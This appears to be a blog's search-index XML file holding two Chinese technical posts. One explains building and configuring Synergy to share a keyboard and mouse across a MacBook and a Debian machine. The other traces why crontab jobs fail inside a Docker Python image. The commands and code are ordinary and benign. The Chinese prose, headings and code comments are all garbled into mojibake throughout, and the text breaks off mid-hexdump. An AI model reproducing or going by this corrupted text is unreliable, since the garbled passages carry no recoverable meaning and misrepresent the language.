<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>synergyå¤šä¸»æœºå…±äº«é”®é¼ </title>
      <link href="2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"/>
      <url>2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å®¶é‡Œæœ‰å°ç ´æ—§çš„ç¬”è®°æœ¬ï¼Œä¸ºäº†è®©å®ƒç»§ç»­å‘å…‰å‘çƒ­ï¼Œæ‰“ç®—å®‰è£…Debianç³»ç»Ÿé…ç½®å¼€å‘ç¯å¢ƒï¼›åå¹´å‰çš„ç¬”è®°æœ¬æ”¹è£…åä¾ç„¶å¯ä»¥å¼€å‘è¯¸å¦‚PHPæˆ–pythonä¹‹ç±»ä¸éœ€è¦ç¼–è¯‘çš„é¡¹ç›®ã€‚ç¬”è€…çš„å·¥ä½œæœ¬æ˜¯mbp, ä¸¤å°ç¬”è®°æœ¬å¼€å‘æ—¶æ€»æ˜¯æ¥å›åˆ‡æ¢é¼ æ ‡é”®ç›˜æ¯”è¾ƒéº»çƒ¦ï¼Œå› æ­¤éœ€è¦é€šè¿‡mbpæ“ä½œæ—§ç‰ˆç¬”è®°æœ¬ã€‚</p><p>synergyæ˜¯ä¸€ä¸ªè·¨å¹³å°è½¯ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¸€å¥—é”®é¼ æ“ä½œå¤šä¸ªä¸åŒç³»ç»Ÿä¸»æœºçš„è½¯ä»¶ï¼›åŒç±»å‹çš„è¿˜æœ‰å¾®è½¯æ¨å‡ºçš„<a href="https://answers.microsoft.com/en-us/windows/forum/windows_10-start/mouse-without-borders-mousewithoutborders/0523308d-3406-4273-b86e-bef28aa6b50d?page=6"><code>æ— ç•Œ</code></a>è½¯ä»¶ï¼Œä¸è¿‡è¯¥è½¯ä»¶ä»…é™Windowså¹³å°æ“ä½œã€‚</p><p>synergyåˆ†ä¸ºæ”¶è´¹ç‰ˆå’Œå¼€æºç‰ˆæœ¬ï¼Œå¼€æºç‰ˆæœ¬æ˜¯å‘½ä»¤è¡Œæ“ä½œï¼ˆæ— GUIï¼‰ï¼Œæ»¡è¶³åŸºæœ¬æ“ä½œã€‚</p><h2 id="æ„å»º"><a href="#æ„å»º" class="headerlink" title="æ„å»º"></a>æ„å»º</h2><ul><li><p>ä¸‹è½½æºç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/symless/synergy-core.git</span><br><span class="line"></span><br><span class="line">cd synergy-core</span><br><span class="line"></span><br><span class="line">git checkout v2.0.0-stable</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®ç¼–è¯‘(MacOS)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// ä¾èµ–qt, å¦‚æœæ²¡æœ‰å®‰è£…å¯ä»¥brew install qt</span><br><span class="line">// æŸ¥çœ‹qtå®‰è£…ç›®å½•</span><br><span class="line">brew info qt </span><br><span class="line"></span><br><span class="line">// è®¾ç½®Cmakeç¯å¢ƒå˜é‡</span><br><span class="line">export CMAKE_PREFIX_PATH=&quot;/usr/local/Cellar/qt/5.15.0/Frameworks/&quot;</span><br><span class="line"></span><br><span class="line">// è®¾ç½®æ„å»ºmakeæ–‡ä»¶ç›®å½•</span><br><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line"></span><br><span class="line">// æ³¨æ„big surç‰ˆæœ¬çš„sdkç‰ˆæœ¬æ˜¯11.0.sdk</span><br><span class="line">cmake -DCMAKE_OSX_SYSROOT=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX11.0.sdk  -DCMAKE_OSX_DEPLOYMENT_TARGET=11.0 -DCMAKE_OSX_ARCHITECTURES=x86_64 ..</span><br><span class="line"></span><br><span class="line">// ç¼–è¯‘</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">// makeæˆåŠŸåç”Ÿæˆä¸‰ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…¶ä¸­synergy-coreæ˜¯æ ¸å¿ƒæ–‡ä»¶ï¼Œå…¶ä»–ä¸¤ä¸ªæ˜¯æ—§ç‰ˆæœ¬ç¨‹åº</span><br><span class="line">synergy-core </span><br><span class="line">synergyc</span><br><span class="line">synergys</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>é…ç½®ç¼–è¯‘(Debian)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/symless/synergy-core.git</span><br><span class="line">cd synergy-core</span><br><span class="line">git checkout v2.0.0-stable</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">// Debian8ç‰ˆæœ¬çš„cmakeéœ€è¦å‡çº§</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>synergyé…ç½®ç¤ºä¾‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span> <span class="string">server.conf</span></span><br><span class="line"><span class="string">//</span> <span class="string">é…ç½®å‚è€ƒ:</span> <span class="string">https://github.com/symless/synergy-core/wiki/Text-Config</span></span><br><span class="line"><span class="comment"># sample synergy configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># comments begin with the # character and continue to the end of</span></span><br><span class="line"><span class="comment"># line.  comments may appear anywhere the syntax permits.</span></span><br><span class="line"><span class="comment"># +----------+  +---------+ +---------+</span></span><br><span class="line"><span class="comment"># | mac-mini |  | macbook | | windows |</span></span><br><span class="line"><span class="comment"># |          |  |         | |         |</span></span><br><span class="line"><span class="comment"># +----------+  +---------+ +---------+</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">screens</span></span><br><span class="line">    <span class="comment"># three hosts named:  mac-mini, macbook, and windows</span></span><br><span class="line">    <span class="comment"># These are the nice names of the hosts to make it easy to write the config file</span></span><br><span class="line">    <span class="comment"># The aliases section below contain the &quot;actual&quot; names of the hosts (their hostnames)</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">    <span class="attr">windows:</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">links</span></span><br><span class="line">    <span class="comment"># windows is to the right of macbook</span></span><br><span class="line">    <span class="comment"># mac-mini is to the left of macbook</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">        <span class="string">right(0,100)</span> <span class="string">=</span> <span class="string">windows</span> <span class="comment"># the numbers in parentheses indicate the percentage of the screen&#x27;s edge to be considered active for switching)</span></span><br><span class="line">        <span class="string">left</span>  <span class="string">=</span> <span class="string">debian</span></span><br><span class="line">        <span class="comment"># shift = shift (shift, alt, super, meta can be mapped to any of the others)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># macbook is to the right of mac-mini</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">        <span class="string">right</span> <span class="string">=</span> <span class="string">macbook</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># macbook is to the left of windows</span></span><br><span class="line">    <span class="attr">windows:</span></span><br><span class="line">        <span class="string">left</span>  <span class="string">=</span> <span class="string">macbook</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">aliases</span></span><br><span class="line">    <span class="comment"># The &quot;real&quot; name of windows is John-Smiths-windows-3.local. </span></span><br><span class="line">    <span class="comment"># If we wanted we could remove this alias and instead use John-Smiths-windows-3.local everywhere windows is above. </span></span><br><span class="line">    <span class="comment"># Hopefully it should be easy to see why using an alias is nicer</span></span><br><span class="line">    <span class="attr">macbook:</span></span><br><span class="line">        <span class="string">mbp</span></span><br><span class="line">    <span class="attr">debian:</span></span><br><span class="line">        <span class="string">debian.local</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"></span><br><span class="line"><span class="attr">section:</span> <span class="string">options</span></span><br><span class="line">    <span class="string">switchDelay</span> <span class="string">=</span> <span class="number">400</span>   <span class="comment"># é¼ æ ‡æ»‘åˆ°è¾¹ç¼˜æ—¶ï¼Œæç•™å¤šä¹…æ‰èƒ½åˆ‡æ¢å±å¹•</span></span><br><span class="line">    <span class="string">clipboardSharing</span> <span class="string">=</span> <span class="literal">true</span> <span class="comment"># å…±äº«å‰ªåˆ‡æ¿</span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>ç¬”è€…é‡‡ç”¨mbpä½œä¸ºæœåŠ¡ç«¯æ§åˆ¶Debianç³»ç»Ÿæ“ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯macç¯å¢ƒè¿è¡Œè½¯ä»¶éœ€è¦è®¾ç½®ç»™itermé…ç½®æƒé™(itermç»ˆç«¯æ‰§è¡Œsynergy)</p><p>æœªé…ç½®æƒé™æŠ¥é”™:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">error </span>failed to create quartz event tap</span><br></pre></td></tr></table></figure><p>macç¯å¢ƒæƒé™é…ç½®: ç³»ç»Ÿåå¥½è®¾ç½® -&gt; å®‰å…¨æ€§ä¸éšç§ -&gt; è¾…åŠ©åŠŸèƒ½ -&gt; iterm.appå…è®¸</p><ul><li>æœåŠ¡ç«¯(mbp)<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span> addresså‚æ•°ä»£è¡¨æœåŠ¡ç«¯ä¸»æœºIPåœ°å€</span><br><span class="line">sudo <span class="string">./synergy-core</span> <span class="params">--server</span> <span class="params">--address</span> 192.168.1.100 <span class="params">--no-daemon</span> <span class="params">--name</span> macbook <span class="params">--config</span> <span class="string">./server.conf</span></span><br></pre></td></tr></table></figure></li><li>å®¢æˆ·ç«¯(Debian)<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="string">./synergy-core</span> <span class="params">--client</span> <span class="params">--no-daemon</span> <span class="params">--name</span> debian 192.168.1.100</span><br></pre></td></tr></table></figure></li></ul><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><p>æ“ä½œmbpçš„è§¦æ‘¸æ¿ç§»åŠ¨åˆ°å±å¹•å¤–æ—¶ä¼šè¿›å…¥åˆ°Debianç³»ç»Ÿå±å¹•ä¸­ï¼ŒåŒä¸€å±€åŸŸç½‘ä¸­æ“ä½œæµç•…ï¼Œæ²¡æœ‰å¡é¡¿ç°è±¡ã€‚</p><p>å¦‚æœDebianä¸ºserverç«¯æ“ä½œmbpæ—¶ä¼šå¯¼è‡´é¼ æ ‡ç§»åŠ¨åˆ°mbpå±å¹•æ—¶ç‚¹å‡»æ— æ•ˆæƒ…å†µã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>1ã€[Synergy-coreç¼–è¯‘ä½¿ç”¨æ•™ç¨‹] <a href="https://segmentfault.com/a/1190000023512582">https://segmentfault.com/a/1190000023512582</a></p><p>2ã€[synergyæ–‡æ¡£] <a href="https://github.com/symless/synergy-core/wiki/Compiling">https://github.com/symless/synergy-core/wiki/Compiling</a></p><p>3ã€[cmakeå®˜ç½‘] <a href="https://cmake.org/download/">https://cmake.org/download/</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> synergy </tag>
            
            <tag> å…±äº«é”®é¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerç¯å¢ƒä¹‹Crontabè¸©å‘</title>
      <link href="2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/"/>
      <url>2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-èƒŒæ™¯"><a href="#0x1-èƒŒæ™¯" class="headerlink" title="0x1.èƒŒæ™¯"></a>0x1.èƒŒæ™¯</h2><p>ä¸šåŠ¡ä¸­é‡åˆ°Pythoné•œåƒä½¿ç”¨crontabæ‰§è¡Œä»»åŠ¡ä¸æ‰§è¡Œçš„æƒ…å†µï¼Œé€šè¿‡ä¸€ç³»åˆ—å®šä½åˆ†æåå‘ç°crontabåœ¨å¤„ç†ç¯å¢ƒå˜é‡å’Œcrontabä»»åŠ¡æ–‡ä»¶è§£æå­˜åœ¨é—®é¢˜ã€‚</p><p>ç¯å¢ƒ</p><ul><li>é•œåƒ: Python:3.7.5</li><li>Crontabç‰ˆæœ¬: 3.0pl1-127+deb8u2</li></ul><p>crontabä»»åŠ¡æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /usr/local/bin/python job.py &gt;&gt; /tmp/job.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="0x2-ç¯å¢ƒå˜é‡"><a href="#0x2-ç¯å¢ƒå˜é‡" class="headerlink" title="0x2.ç¯å¢ƒå˜é‡"></a>0x2.ç¯å¢ƒå˜é‡</h2><p>pythonç¨‹åºæ‰§è¡Œæ—¶é‡‡ç”¨<code>os.environ</code>è¯»å–ç¯å¢ƒå˜é‡ï¼Œåœ¨è°ƒè¯•ç¨‹åºæ—¶å‘ç°dockeré•œåƒæ‰“åŒ…è¿è¡Œåï¼Œç¨‹åºæŠ¥é”™æ— æ³•è¯»å–ç¯å¢ƒå˜é‡å€¼ã€‚ç™»é™†åˆ°k8sç¯å¢ƒä¸­æ‰‹åŠ¨æ‰§è¡Œenvå‘½ä»¤å‘ç°æ˜¯å¯ä»¥è·å–æ³¨å…¥çš„ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹pythonæ–‡ä»¶æ‰“å°envç¯å¢ƒä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ(&#123;&#x27;HOME&#x27;: &#x27;/root&#x27;, &#x27;LOGNAME&#x27;: &#x27;root&#x27;, &#x27;PATH&#x27;: &#x27;/usr/bin:/bin&#x27;, &#x27;SHELL&#x27;: &#x27;/bin/sh&#x27;, &#x27;PWD&#x27;: &#x27;/root&#x27;, &#x27;LC_CTYPE&#x27;: &#x27;C.UTF-8&#x27;&#125;)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ç¯å¢ƒæ˜¯åŸºç¡€çš„ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œpythonç¨‹åºæ— æ³•åœ¨æ‰§è¡Œç¯å¢ƒè·å–æ–°å¢çš„ç¯å¢ƒå˜é‡ã€‚åœ¨æŸ¥æ‰¾èµ„æ–™è¿‡ç¨‹ä¸­å‘ç°crontabå®ˆæŠ¤è¿›ç¨‹ä¼šä»<code>/etc/environment</code>å’Œ<code>/etc/default/locale</code>è·å–ç¯å¢ƒå˜é‡ã€‚åœ¨Debianç¯å¢ƒä¸­é‡‡ç”¨serviceçš„æ–¹å¼è¿è¡Œ<code>/usr/sbin/cron</code>, å®šä½å¯¹åº”çš„æ‰§è¡Œè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/init.d/cron</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">parse_environment ()</span><br><span class="line">&#123;</span><br><span class="line">    for ENV_FILE in /etc/environment /etc/default/locale; do</span><br><span class="line">        [ -r &quot;$ENV_FILE&quot; ] || continue</span><br><span class="line">        [ -s &quot;$ENV_FILE&quot; ] || continue</span><br><span class="line"></span><br><span class="line">         for var in LANG LANGUAGE LC_ALL LC_CTYPE; do</span><br><span class="line">             value=`egrep &quot;^$&#123;var&#125;=&quot; &quot;$ENV_FILE&quot; | tail -n1 | cut -d= -f2`</span><br><span class="line">             [ -n &quot;$value&quot; ] &amp;&amp; eval export $var=$value</span><br><span class="line"></span><br><span class="line">             if [ -n &quot;$value&quot; ] &amp;&amp; [ &quot;$ENV_FILE&quot; = /etc/environment ]; then</span><br><span class="line">                 log_warning_msg &quot;/etc/environment has been deprecated for locale information; use /etc/default/locale for $var=$value instead&quot;</span><br><span class="line">             fi</span><br><span class="line">         done</span><br><span class="line">     done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Get the timezone <span class="built_in">set</span>.</span></span><br><span class="line">    if [ -z &quot;$TZ&quot; -a -e /etc/timezone ]; then</span><br><span class="line">        TZ=`cat /etc/timezone`</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Parse the system<span class="string">&#x27;s environment</span></span></span><br><span class="line">if [ &quot;$READ_ENV&quot; = &quot;yes&quot; ] ; then</span><br><span class="line">    parse_environment</span><br><span class="line">fi</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>shellè„šæœ¬é‡‡ç”¨åŠ è½½environmentå’Œlocaleæ–‡ä»¶å°†ç¯å¢ƒå˜é‡æ³¨å…¥åˆ°å½“å‰è¿›ç¨‹ç¯å¢ƒä¸­ï¼Œæ ¹æ®crontabåœ¨<code>bug#543895</code>æè¿°æ¨èä½¿ç”¨localeæ–‡ä»¶ã€‚</p><p>ç»è¿‡ä¸Šè¿°åˆ†æï¼Œéœ€è¦è°ƒæ•´Dockerfileç›¸å…³æ–‡ä»¶æ“ä½œï¼›è¿™é‡Œé‡‡ç”¨entrypoint.shæ–‡ä»¶æ³¨å…¥ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env &gt;&gt; /etc/default/locale</span><br></pre></td></tr></table></figure><h2 id="0x3-ä»»åŠ¡è§£æä¸æƒé™"><a href="#0x3-ä»»åŠ¡è§£æä¸æƒé™" class="headerlink" title="0x3.ä»»åŠ¡è§£æä¸æƒé™"></a>0x3.ä»»åŠ¡è§£æä¸æƒé™</h2><p>crontabä»»åŠ¡åˆ›å»ºæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç›´æ¥ä½¿ç”¨crontabå‘½ä»¤æ‰‹åŠ¨ç¼–è¾‘å†™å…¥ï¼Œå¦ä¸€ç§æ˜¯å°†å†™å¥½çš„ä»»åŠ¡æ–‡ä»¶å¤åˆ¶åˆ°<code>/var/spool/cron/crontabs</code>ç›®å½•ä¸­ã€‚</p><p>æ’æŸ¥æŸä¸ªä¸šåŠ¡é—®é¢˜æ—¶ï¼Œå‘ç°crontabä»»åŠ¡ä¸èƒ½æ‰§è¡Œï¼ˆé‡‡ç”¨æ–‡ä»¶å¤åˆ¶å½¢å¼ï¼‰ï¼›è¿›å…¥PODå®¹å™¨ä¸­ä½¿ç”¨catå‘½ä»¤æŸ¥çœ‹ä»»åŠ¡æ–‡ä»¶ä¹Ÿæ˜¯æ˜¾ç¤ºæ­£å¸¸ï¼Œä½†æ˜¯ä»»åŠ¡è¿˜æ˜¯ä¸èƒ½æ‰§è¡Œã€‚åæ¥é€šè¿‡crontabæŸ¥çœ‹ä¿å­˜åï¼Œä»»åŠ¡èƒ½æ­£å¸¸æ‰§è¡Œã€‚</p><p>å›æº¯ä¸¤æ¬¡æ“ä½œæ—¶ï¼Œå‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„é—®é¢˜ã€‚é—®é¢˜ä¸€æ˜¯crontabå‘½ä»¤ç¼–è¾‘ä»»åŠ¡æ–‡ä»¶ä¿å­˜åï¼Œè¯¥ä»»åŠ¡æ–‡ä»¶çš„ç»„æƒé™å˜æˆ<code>root:crontab</code>(åŸroot:root);é—®é¢˜äºŒæ˜¯crontabå‘½ä»¤ç¼–è¾‘æŸ¥çœ‹æ–‡ä»¶åç›´æ¥ä¿å­˜ï¼Œæ–‡ä»¶å¤§å°å‘ç”Ÿæ”¹å˜ï¼Œæ­¤è¿‡ç¨‹æ— äººä¸ºæ›´æ”¹å†…å®¹ã€‚</p><p>é—®é¢˜ä¸€çš„å‡ºç°æ˜¯å› ä¸ºcrontabå‘½ä»¤ç¼–è¾‘æ–‡ä»¶æ—¶ä¼šè®¾ç½®ä»»åŠ¡æ–‡ä»¶çš„ç»„ï¼ŒDebiané•œåƒç¯å¢ƒä¸­åªæœ‰rootç”¨æˆ·ï¼Œç”¨æˆ·ç»„åˆ—è¡¨ä¸­æ˜¯å­˜åœ¨crontabç»„ã€‚ç”±äºDockerç¯å¢ƒä¸­åªæœ‰rootç”¨æˆ·æ‰§è¡Œï¼Œä¸éœ€è¦è°ƒæ•´ä»»åŠ¡æ–‡ä»¶çš„æƒé™ï¼›ä½†éDockerç¯å¢ƒä¸­ï¼Œcrontabçš„ä»»åŠ¡æ–‡ä»¶ä¸€èˆ¬è®¾ç½®600æƒé™å±…å¤šï¼›cronå®ˆæŠ¤è¿›ç¨‹è¯»å–æ–‡ä»¶æ—¶ä¼šæ ¡éªŒæƒé™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#https:<span class="comment">//github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/database.c#L206</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*ä»»åŠ¡æ–‡ä»¶æƒé™æ ¡éªŒ*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(fname, <span class="string">&quot;*system*&quot;</span>) &amp;&amp; !(pw = getpwnam(uname))) &#123;</span><br><span class="line"><span class="comment">/* file doesn&#x27;t have a user in passwd file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;ORPHAN&quot;</span>, <span class="string">&quot;no passwd entry&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((crontab_fd = open(tabname, O_RDONLY, <span class="number">0</span>)) &lt; OK) &#123;</span><br><span class="line"><span class="comment">/* crontab not accessible?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;CAN&#x27;T OPEN&quot;</span>, tabname);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstat(crontab_fd, statbuf) &lt; OK) &#123;</span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;FSTAT FAILED&quot;</span>, tabname);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*æŸ¥è¯¢/etc/passwdæ–‡ä»¶ä¸­ç”¨æˆ·*/</span></span><br><span class="line">u = find_user(old_db, fname);</span><br><span class="line"><span class="keyword">if</span> (u != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* if crontab has not changed since we last read it</span></span><br><span class="line"><span class="comment"> * in, then we can just use our existing entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (u-&gt;mtime == statbuf-&gt;st_mtime) &#123;</span><br><span class="line">Debug(DLOAD, (<span class="string">&quot; [no change, using old data]&quot;</span>))</span><br><span class="line">unlink_user(old_db, u);</span><br><span class="line">link_user(new_db, u);</span><br><span class="line"><span class="keyword">goto</span> next_crontab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* before we fall through to the code that will reload</span></span><br><span class="line"><span class="comment"> * the user, let&#x27;s deallocate and unlink the user in</span></span><br><span class="line"><span class="comment"> * the old database.  This is more a point of memory</span></span><br><span class="line"><span class="comment"> * efficiency than anything else, since all leftover</span></span><br><span class="line"><span class="comment"> * users will be deleted from the old database when</span></span><br><span class="line"><span class="comment"> * we finish with the crontab...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Debug(DLOAD, (<span class="string">&quot; [delete old data]&quot;</span>))</span><br><span class="line">unlink_user(old_db, u);</span><br><span class="line">free_user(u);</span><br><span class="line">log_it(fname, getpid(), <span class="string">&quot;RELOAD&quot;</span>, tabname);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>é—®é¢˜äºŒçš„å‡ºç°æ¯”è¾ƒè¯¡å¼‚ï¼Œæ–‡ä»¶å¤§å°å˜åŒ–ä½†catæŸ¥çœ‹æ–‡ä»¶å†…å®¹æ²¡æœ‰æ˜æ˜¾å˜åŒ–ã€‚é€šè¿‡xxdå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶æ”¹åŠ¨å‰åçš„åå…­è¿›åˆ¶ä¿¡æ¯</p><ul><li><p>crontabæ”¹åŠ¨å‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c  0 0 * * * /usr/l</span><br><span class="line">00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20  ocal/bin/python</span><br><span class="line">//çœç•¥...</span><br><span class="line">000000f0: 2e6c 6f67 2032 3e26 31                   .log 